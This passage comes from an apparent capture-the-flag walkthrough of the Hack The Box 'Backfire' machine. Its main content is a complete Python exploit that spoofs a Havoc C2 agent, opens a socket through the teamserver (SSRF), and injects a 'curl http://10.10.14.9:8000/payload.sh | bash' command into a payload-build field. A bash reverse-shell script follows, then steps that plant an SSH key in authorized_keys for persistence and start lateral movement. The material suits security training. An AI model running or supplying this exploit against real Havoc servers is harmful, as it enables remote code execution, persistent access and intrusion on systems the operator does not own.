class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import json</span><br><span class="line">import hashlib</span><br><span class="line">import binascii</span><br><span class="line">import random</span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">import urllib3</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util import Counter</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">key_bytes = 32</span><br><span class="line"></span><br><span class="line">def decrypt(key, iv, ciphertext):</span><br><span class="line">    if len(key) &lt;= key_bytes:</span><br><span class="line">        for _ in range(len(key), key_bytes):</span><br><span class="line">            key += b&quot;0&quot;</span><br><span class="line"></span><br><span class="line">    assert len(key) == key_bytes</span><br><span class="line"></span><br><span class="line">    iv_int = int(binascii.hexlify(iv), 16)</span><br><span class="line">    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)</span><br><span class="line">    aes = AES.new(key, AES.MODE_CTR, counter=ctr)</span><br><span class="line"></span><br><span class="line">    plaintext = aes.decrypt(ciphertext)</span><br><span class="line">    return plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def int_to_bytes(value, length=4, byteorder=&quot;big&quot;):</span><br><span class="line">    return value.to_bytes(length, byteorder)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encrypt(key, iv, plaintext):</span><br><span class="line">    if len(key) &lt;= key_bytes:</span><br><span class="line">        for x in range(len(key), key_bytes):</span><br><span class="line">            key = key + b&quot;0&quot;</span><br><span class="line"></span><br><span class="line">        assert len(key) == key_bytes</span><br><span class="line"></span><br><span class="line">        iv_int = int(binascii.hexlify(iv), 16)</span><br><span class="line">        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)</span><br><span class="line">        aes = AES.new(key, AES.MODE_CTR, counter=ctr)</span><br><span class="line"></span><br><span class="line">        ciphertext = aes.encrypt(plaintext)</span><br><span class="line">        return ciphertext</span><br><span class="line"></span><br><span class="line">def register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):</span><br><span class="line">    command = b&quot;\x00\x00\x00\x63&quot;</span><br><span class="line">    request_id = b&quot;\x00\x00\x00\x01&quot;</span><br><span class="line">    demon_id = agent_id</span><br><span class="line"></span><br><span class="line">    hostname_length = int_to_bytes(len(hostname))</span><br><span class="line">    username_length = int_to_bytes(len(username))</span><br><span class="line">    domain_name_length = int_to_bytes(len(domain_name))</span><br><span class="line">    internal_ip_length = int_to_bytes(len(internal_ip))</span><br><span class="line">    process_name_length = int_to_bytes(len(process_name) - 6)</span><br><span class="line"></span><br><span class="line">    data = b&quot;\xab&quot; * 100</span><br><span class="line"></span><br><span class="line">    header_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data</span><br><span class="line"></span><br><span class="line">    size = 12 + len(header_data)</span><br><span class="line">    size_bytes = size.to_bytes(4, &#x27;big&#x27;)</span><br><span class="line">    agent_header = size_bytes + magic + agent_id</span><br><span class="line">    print(agent_header + header_data)</span><br><span class="line">    print(&quot;[***] Trying to register agent...&quot;)</span><br><span class="line">    r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)</span><br><span class="line">    if r.status_code == 200:</span><br><span class="line">        print(&quot;[***] Success!&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&quot;[!!!] Failed to register agent - &#123;r.status_code&#125; &#123;r.text&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def open_socket(socket_id, target_address, target_port):</span><br><span class="line">    command = b&quot;\x00\x00\x09\xec&quot;</span><br><span class="line">    request_id = b&quot;\x00\x00\x00\x02&quot;</span><br><span class="line">    subcommand = b&quot;\x00\x00\x00\x10&quot;</span><br><span class="line">    sub_request_id = b&quot;\x00\x00\x00\x03&quot;</span><br><span class="line">    local_addr = b&quot;\x22\x22\x22\x22&quot;</span><br><span class="line">    local_port = b&quot;\x33\x33\x33\x33&quot;</span><br><span class="line"></span><br><span class="line">    forward_addr = b&quot;&quot;</span><br><span class="line">    for octet in target_address.split(&quot;.&quot;)[::-1]:</span><br><span class="line">        forward_addr += int_to_bytes(int(octet), length=1)</span><br><span class="line"></span><br><span class="line">    forward_port = int_to_bytes(target_port)</span><br><span class="line"></span><br><span class="line">    package = subcommand + socket_id + local_addr + local_port + forward_addr + forward_port</span><br><span class="line">    package_size = int_to_bytes(len(package) + 4)</span><br><span class="line"></span><br><span class="line">    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)</span><br><span class="line"></span><br><span class="line">    size = 12 + len(header_data)</span><br><span class="line">    size_bytes = size.to_bytes(4, &#x27;big&#x27;)</span><br><span class="line">    agent_header = size_bytes + magic + agent_id</span><br><span class="line">    data = agent_header + header_data</span><br><span class="line"></span><br><span class="line">    print(&quot;[***] Trying to open socket on the teamserver...&quot;)</span><br><span class="line">    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)</span><br><span class="line">    if r.status_code == 200:</span><br><span class="line">        print(&quot;[***] Success!&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&quot;[!!!] Failed to open socket on teamserver - &#123;r.status_code&#125; &#123;r.text&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write_socket(socket_id, data):</span><br><span class="line">    command = b&quot;\x00\x00\x09\xec&quot;</span><br><span class="line">    request_id = b&quot;\x00\x00\x00\x08&quot;</span><br><span class="line">    subcommand = b&quot;\x00\x00\x00\x11&quot;</span><br><span class="line">    sub_request_id = b&quot;\x00\x00\x00\xa1&quot;</span><br><span class="line">    socket_type = b&quot;\x00\x00\x00\x03&quot;</span><br><span class="line">    success = b&quot;\x00\x00\x00\x01&quot;</span><br><span class="line"></span><br><span class="line">    data_length = int_to_bytes(len(data))</span><br><span class="line"></span><br><span class="line">    package = subcommand + socket_id + socket_type + success + data_length + data</span><br><span class="line">    package_size = int_to_bytes(len(package) + 4)</span><br><span class="line"></span><br><span class="line">    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)</span><br><span class="line"></span><br><span class="line">    size = 12 + len(header_data)</span><br><span class="line">    size_bytes = size.to_bytes(4, &#x27;big&#x27;)</span><br><span class="line">    agent_header = size_bytes + magic + agent_id</span><br><span class="line">    post_data = agent_header + header_data</span><br><span class="line">    print(post_data)</span><br><span class="line">    print(&quot;[***] Trying to write to the socket&quot;)</span><br><span class="line">    r = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)</span><br><span class="line">    if r.status_code == 200:</span><br><span class="line">        print(&quot;[***] Success!&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&quot;[!!!] Failed to write data to the socket - &#123;r.status_code&#125; &#123;r.text&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read_socket(socket_id):</span><br><span class="line">    command = b&quot;\x00\x00\x00\x01&quot;</span><br><span class="line">    request_id = b&quot;\x00\x00\x00\x09&quot;</span><br><span class="line"></span><br><span class="line">    header_data = command + request_id</span><br><span class="line"></span><br><span class="line">    size = 12 + len(header_data)</span><br><span class="line">    size_bytes = size.to_bytes(4, &#x27;big&#x27;)</span><br><span class="line">    agent_header = size_bytes + magic + agent_id</span><br><span class="line">    data = agent_header + header_data</span><br><span class="line"></span><br><span class="line">    print(&quot;[***] Trying to poll teamserver for socket output...&quot;)</span><br><span class="line">    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)</span><br><span class="line">    if r.status_code == 200:</span><br><span class="line">        print(&quot;[***] Read socket output successfully!&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&quot;[!!!] Failed to read socket output - &#123;r.status_code&#125; &#123;r.text&#125;&quot;)</span><br><span class="line">        return &quot;&quot;</span><br><span class="line"></span><br><span class="line">    command_id = int.from_bytes(r.content[0:4], &quot;little&quot;)</span><br><span class="line">    request_id = int.from_bytes(r.content[4:8], &quot;little&quot;)</span><br><span class="line">    package_size = int.from_bytes(r.content[8:12], &quot;little&quot;)</span><br><span class="line">    enc_package = r.content[12:]</span><br><span class="line"></span><br><span class="line">    return decrypt(AES_Key, AES_IV, enc_package)[12:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create_websocket_request(host, port):</span><br><span class="line">    request = (</span><br><span class="line">        f&quot;GET /havoc/ HTTP/1.1\r\n&quot;</span><br><span class="line">        f&quot;Host: &#123;host&#125;:&#123;port&#125;\r\n&quot;</span><br><span class="line">        f&quot;Upgrade: websocket\r\n&quot;</span><br><span class="line">        f&quot;Connection: Upgrade\r\n&quot;</span><br><span class="line">        f&quot;Sec-WebSocket-Key: 5NUvQyzkv9bpu376gKd2Lg==\r\n&quot;</span><br><span class="line">        f&quot;Sec-WebSocket-Version: 13\r\n&quot;</span><br><span class="line">        f&quot;\r\n&quot;</span><br><span class="line">    ).encode()</span><br><span class="line">    return request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def build_websocket_frame(payload):</span><br><span class="line">    payload_bytes = payload.encode(&quot;utf-8&quot;)</span><br><span class="line">    frame = bytearray()</span><br><span class="line">    frame.append(0x81)</span><br><span class="line">    payload_length = len(payload_bytes)</span><br><span class="line">    if payload_length &lt;= 125:</span><br><span class="line">        frame.append(0x80 | payload_length)</span><br><span class="line">    elif payload_length &lt;= 65535:</span><br><span class="line">        frame.append(0x80 | 126)</span><br><span class="line">        frame.extend(payload_length.to_bytes(2, byteorder=&quot;big&quot;))</span><br><span class="line">    else:</span><br><span class="line">        frame.append(0x80 | 127)</span><br><span class="line">        frame.extend(payload_length.to_bytes(8, byteorder=&quot;big&quot;))</span><br><span class="line"></span><br><span class="line">    masking_key = os.urandom(4)</span><br><span class="line">    frame.extend(masking_key)</span><br><span class="line">    masked_payload = bytearray(byte ^ masking_key[i % 4] for i, byte in enumerate(payload_bytes))</span><br><span class="line">    frame.extend(masked_payload)</span><br><span class="line"></span><br><span class="line">    return frame</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(&quot;-t&quot;, &quot;--target&quot;, help=&quot;The listener target in URL format&quot;, required=True)</span><br><span class="line">parser.add_argument(&quot;-i&quot;, &quot;--ip&quot;, help=&quot;The IP to open the socket with&quot;, required=True)</span><br><span class="line">parser.add_argument(&quot;-p&quot;, &quot;--port&quot;, help=&quot;The port to open the socket with&quot;, required=True)</span><br><span class="line">parser.add_argument(&quot;-A&quot;, &quot;--user-agent&quot;, help=&quot;The User-Agent for the spoofed agent&quot;, default=&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;)</span><br><span class="line">parser.add_argument(&quot;-H&quot;, &quot;--hostname&quot;, help=&quot;The hostname for the spoofed agent&quot;, default=&quot;DESKTOP-7F61JT1&quot;)</span><br><span class="line">parser.add_argument(&quot;-u&quot;, &quot;--username&quot;, help=&quot;The username for the spoofed agent&quot;, default=&quot;Administrator&quot;)</span><br><span class="line">parser.add_argument(&quot;-d&quot;, &quot;--domain-name&quot;, help=&quot;The domain name for the spoofed agent&quot;, default=&quot;ECORP&quot;)</span><br><span class="line">parser.add_argument(&quot;-n&quot;, &quot;--process-name&quot;, help=&quot;The process name for the spoofed agent&quot;, default=&quot;msedge.exe&quot;)</span><br><span class="line">parser.add_argument(&quot;-ip&quot;, &quot;--internal-ip&quot;, help=&quot;The internal ip for the spoofed agent&quot;, default=&quot;10.1.33.7&quot;)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">magic = b&quot;\xde\xad\xbe\xef&quot;</span><br><span class="line">teamserver_listener_url = args.target</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: args.user_agent</span><br><span class="line">&#125;</span><br><span class="line">agent_id = int_to_bytes(random.randint(100000, 1000000))</span><br><span class="line">AES_Key = b&quot;\x00&quot; * 32</span><br><span class="line">AES_IV = b&quot;\x00&quot; * 16</span><br><span class="line">hostname = bytes(args.hostname, encoding=&quot;utf-8&quot;)</span><br><span class="line">username = bytes(args.username, encoding=&quot;utf-8&quot;)</span><br><span class="line">domain_name = bytes(args.domain_name, encoding=&quot;utf-8&quot;)</span><br><span class="line">internal_ip = bytes(args.internal_ip, encoding=&quot;utf-8&quot;)</span><br><span class="line">process_name = args.process_name.encode(&quot;utf-16le&quot;)</span><br><span class="line">process_id = int_to_bytes(random.randint(1000, 5000))</span><br><span class="line"></span><br><span class="line">register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)</span><br><span class="line"></span><br><span class="line">socket_id = b&quot;\x11\x11\x11\x11&quot;</span><br><span class="line">open_socket(socket_id, args.ip, int(args.port))</span><br><span class="line"></span><br><span class="line">USER = &quot;ilya&quot;</span><br><span class="line">PASSWORD = &quot;CobaltStr1keSuckz!&quot;</span><br><span class="line">host = &quot;127.0.0.1&quot;</span><br><span class="line">port = 40056</span><br><span class="line">websocket_request = create_websocket_request(host, port)</span><br><span class="line">write_socket(socket_id, websocket_request)</span><br><span class="line">response = read_socket(socket_id)</span><br><span class="line">payload = &#123;&quot;Body&quot;: &#123;&quot;Info&quot;: &#123;&quot;Password&quot;: hashlib.sha3_256(PASSWORD.encode()).hexdigest(), &quot;User&quot;: USER&#125;, &quot;SubEvent&quot;: 3&#125;, &quot;Head&quot;: &#123;&quot;Event&quot;: 1, &quot;OneTime&quot;: &quot;&quot;, &quot;Time&quot;: &quot;18:40:17&quot;, &quot;User&quot;: USER&#125;&#125;</span><br><span class="line">payload_json = json.dumps(payload)</span><br><span class="line">frame = build_websocket_frame(payload_json)</span><br><span class="line">write_socket(socket_id, frame)</span><br><span class="line">response = read_socket(socket_id)</span><br><span class="line"></span><br><span class="line">payload = &#123;&quot;Body&quot;:&#123;&quot;Info&quot;:&#123;&quot;Headers&quot;:&quot;&quot;,&quot;HostBind&quot;:&quot;0.0.0.0&quot;,&quot;HostHeader&quot;:&quot;&quot;,&quot;HostRotation&quot;:&quot;round-robin&quot;,&quot;Hosts&quot;:&quot;0.0.0.0&quot;,&quot;Name&quot;:&quot;abc&quot;,&quot;PortBind&quot;:&quot;443&quot;,&quot;PortConn&quot;:&quot;443&quot;,&quot;Protocol&quot;:&quot;Https&quot;,&quot;Proxy Enabled&quot;:&quot;false&quot;,&quot;Secure&quot;:&quot;true&quot;,&quot;Status&quot;:&quot;online&quot;,&quot;Uris&quot;:&quot;&quot;,&quot;UserAgent&quot;:&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;&#125;,&quot;SubEvent&quot;:1&#125;,&quot;Head&quot;:&#123;&quot;Event&quot;:2,&quot;OneTime&quot;:&quot;&quot;,&quot;Time&quot;:&quot;08:39:18&quot;,&quot;User&quot;: USER&#125;&#125;</span><br><span class="line">payload_json = json.dumps(payload)</span><br><span class="line">frame = build_websocket_frame(payload_json)</span><br><span class="line">write_socket(socket_id, frame)</span><br><span class="line">response = read_socket(socket_id)</span><br><span class="line"></span><br><span class="line">cmd = &quot;curl http://10.10.14.9:8000/payload.sh | bash&quot;</span><br><span class="line">injection = &quot;&quot;&quot; \\\\\\\&quot; -mbla; &quot;&quot;&quot; + cmd + &quot;&quot;&quot; 1&gt;&amp;2 &amp;&amp; false #&quot;&quot;&quot;</span><br><span class="line">payload = &#123;&quot;Body&quot;: &#123;&quot;Info&quot;: &#123;&quot;AgentType&quot;: &quot;Demon&quot;, &quot;Arch&quot;: &quot;x64&quot;, &quot;Config&quot;: &quot;&#123;\n    \&quot;Amsi/Etw Patch\&quot;: \&quot;None\&quot;,\n    \&quot;Indirect Syscall\&quot;: false,\n    \&quot;Injection\&quot;: &#123;\n        \&quot;Alloc\&quot;: \&quot;Native/Syscall\&quot;,\n        \&quot;Execute\&quot;: \&quot;Native/Syscall\&quot;,\n        \&quot;Spawn32\&quot;: \&quot;C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\&quot;,\n        \&quot;Spawn64\&quot;: \&quot;C:\\\\Windows\\\\System32\\\\notepad.exe\&quot;\n    &#125;,\n    \&quot;Jitter\&quot;: \&quot;0\&quot;,\n    \&quot;Proxy Loading\&quot;: \&quot;None (LdrLoadDll)\&quot;,\n    \&quot;Service Name\&quot;:\&quot;&quot; + injection + &quot;\&quot;,\n    \&quot;Sleep\&quot;: \&quot;2\&quot;,\n    \&quot;Sleep Jmp Gadget\&quot;: \&quot;None\&quot;,\n    \&quot;Sleep Technique\&quot;: \&quot;WaitForSingleObjectEx\&quot;,\n    \&quot;Stack Duplication\&quot;: false\n&#125;\n&quot;, &quot;Format&quot;: &quot;Windows Service Exe&quot;, &quot;Listener&quot;: &quot;abc&quot;&#125;, &quot;SubEvent&quot;: 2&#125;, &quot;Head&quot;: &#123;</span><br><span class="line">&quot;Event&quot;: 5, &quot;OneTime&quot;: &quot;true&quot;, &quot;Time&quot;: &quot;18:39:04&quot;, &quot;User&quot;: USER&#125;&#125;</span><br><span class="line">payload_json = json.dumps(payload)</span><br><span class="line">frame = build_websocket_frame(payload_json)</span><br><span class="line">write_socket(socket_id, frame)</span><br><span class="line">response = read_socket(socket_id)</span><br></pre></td></tr></table></figure></div>
+
+<p>before running the python script, create payload.sh which contains reverse shell as such:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash </span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.14.9/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div>
+<p>and host a server at the directory where the payload.sh resides</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-backfire/Pasted image 20250119201726.png"
+                      width="1000"
+                >
+
+
+
+<p>from here, gain shell access as ilya, however, the shell is too unstable as it lasts for only 3 to 5 minutes.<br>Therefore, will need to gain a more stable shell.<br>To do that, we can upload our publickey into &#x2F;home&#x2F;ilya&#x2F;.ssh&#x2F;authorized_keys and use the id_rsa to ssh into ilya.</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -b 4096</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/home/muyi/.ssh/id_rsa):</span><br><span class="line">Enter passphrase for &quot;/home/muyi/.ssh/id_rsa&quot; (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved in /home/muyi/.ssh/id_rsa</span><br><span class="line">Your public key has been saved in /home/muyi/.ssh/id_rsa.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:kGNjc4l22px+6nqOUim2VioLcphQ5AMP0ftqD+Z8rdk muyi@mag3</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 4096]----+</span><br><span class="line">|+o.              |</span><br><span class="line">| *.    o .       |</span><br><span class="line">|  =.  @ +        |</span><br><span class="line">| ... + @ .       |</span><br><span class="line">|.  .  ..S        |</span><br><span class="line">|.o  + +.         |</span><br><span class="line">|= +o B  . .      |</span><br><span class="line">|.*+.*o...o       |</span><br><span class="line">| .+*+oE=+        |</span><br><span class="line">+----[SHA256]-----+</span><br><span class="line"></span><br><span class="line">$ cat .ssh/id_rsa.pub</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCdTyJy/WBStomEXIXH4nDou5Q9uhAY4aKZkoe0ZR2ByStbwEIL6qEVPJl5z6+R9VaBLznPumn174fwhtIE4oz3Zy9a4xWNW5iHhxlaGnwbTWcPRv+5tw0lZxHFCESsPLAeJ//e61J0gIMh3NwJfdROajmSZnTyjd9lU+/H3p+GsuqxuDgktjLR8sGvkhFcbbENuc3p4w9NHQyjUgxjUbK6zX9qBiuKFvfAIdgesfdCgDb9LQrzJAucyqogKLeWUvFpjlS9C2bs31apsF54VUUkioWJHMPgfAGPRv4GDYmtOOqWLifCIHyvzFxyjsTAJ/jo4/bSjW6lSg8mUvFVjwjohaVhyuTHegOE2sgYW+uzplznUAPXhYMSeCGIhYeTzDnVSSq4yx+gqXU1xDwQehpQEhTDtBs8sZ0jtfYn6J/NWIDMirTDTQlqQcDIXJ4uGL4KhpjcCxwxMgGs6zuGFxbky/tCU1zHmExlS4F87uYpOK2W8TS+ei5X8CiAaSld3Uqgxyw7WBGEN9mUBXrfKHPhUHMg3Mc8KkNUMlFGK99xevgcKCDJIxsxydMkztt1Oo0PB1ChhzqI16QqxcxQjQBvI5rpH7MZKwyy4mwh1YXCsT4HPjLLvhyoZFcTIBDoA0PphnFpZ+ZvyD6AhDH5jayg1S5j+y8amB+PIBouq6tXnQ== muyi@mag3</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------ in ilya&#x27;s shell --------------------------------------------------------------------------</span><br><span class="line">ilya@backfire:~/.ssh$ echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCdTyJy/WBStomEXIXH4nDou5Q9uhAY4aKZkoe0ZR2ByStbwEIL6qEVPJl5z6+R9VaBLznPumn174fwhtIE4oz3Zy9a4xWNW5iHhxlaGnwbTWcPRv+5tw0lZxHFCESsPLAeJ//e61J0gIMh3NwJfdROajmSZnTyjd9lU+/H3p+GsuqxuDgktjLR8sGvkhFcbbENuc3p4w9NHQyjUgxjUbK6zX9qBiuKFvfAIdgesfdCgDb9LQrzJAucyqogKLeWUvFpjlS9C2bs31apsF54VUUkioWJHMPgfAGPRv4GDYmtOOqWLifCIHyvzFxyjsTAJ/jo4/bSjW6lSg8mUvFVjwjohaVhyuTHegOE2sgYW+uzplznUAPXhYMSeCGIhYeTzDnVSSq4yx+gqXU1xDwQehpQEhTDtBs8sZ0jtfYn6J/NWIDMirTDTQlqQcDIXJ4uGL4KhpjcCxwxMgGs6zuGFxbky/tCU1zHmExlS4F87uYpOK2W8TS+ei5X8CiAaSld3Uqgxyw7WBGEN9mUBXrfKHPhUHMg3Mc8KkNUMlFGK99xevgcKCDJIxsxydMkztt1Oo0PB1ChhzqI16QqxcxQjQBvI5rpH7MZKwyy4mwh1YXCsT4HPjLLvhyoZFcTIBDoA0PphnFpZ+ZvyD6AhDH5jayg1S5j+y8amB+PIBouq6tXnQ==&#x27; &gt;&gt; authorized_keys</span><br><span class="line"></span><br><span class="line">ilya@backfire:~/.ssh$ chmod 600 authorized_keys</span><br></pre></td></tr></table></figure></div>
+
+<p>once that is done, return to attacker machine to use the generated id_rsa and ssh into ilya. Remember to change the permission.</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(muyi㉿mag3)-[~/.ssh]</span><br><span class="line">└─$ chmod 600 id_rsa</span><br><span class="line"></span><br><span class="line">┌──(muyi㉿mag3)-[~/.ssh]</span><br><span class="line">└─$ ssh -i id_rsa ilya@10.10.11.49</span><br><span class="line">Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64</span><br><span class="line">ilya@backfire:~$ whoami</span><br><span class="line">ilya</span><br><span class="line">ilya@backfire:~$ ls</span><br><span class="line">agent  files  hardhat.txt  Havoc  user.txt</span><br><span class="line">ilya@backfire:~$ ls /home</span><br><span class="line">ilya  sergej</span><br></pre></td></tr></table></figure></div>
+
+<p>from here, need to do lateral movement into <code>sergej</code> before privilege escalation.<br>In the hardhat.txt, <code>ilya</code> mention that <code>sergej</code> has been making a test server of Hard Hat C2 with <em>default settings</em>.</p>
+<p>Therefore, according to the github of the official HardHatC2 installation [<a class="link"   target="_blank" rel="noopener" href="https://github.com/DragoQCC/HardHatC2]" >https://github.com/DragoQCC/HardHatC2]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.<br>Notice that there’s two ports that will be initiated by HardHatC2.</p>
+<ol>
+<li>port 5000 for teamserver’s listening address</li>
+<li>port 7096 for the website GUI I assume</li>
+</ol>
+<p>To verify this:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ilya@backfire:~$ netstat -tuln</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN        // teamserver&#x27;s listener</span><br><span class="line">tcp        0      0 0.0.0.0:7096            0.0.0.0:*               LISTEN        // website GUI</span><br><span class="line">tcp        0      0 127.0.0.1:40056         0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN</span><br><span class="line">udp        0      0 0.0.0.0:68              0.0.0.0:*</span><br></pre></td></tr></table></figure></div>
+
+<p>Moving on, do port forwarding on both ports via:</p>
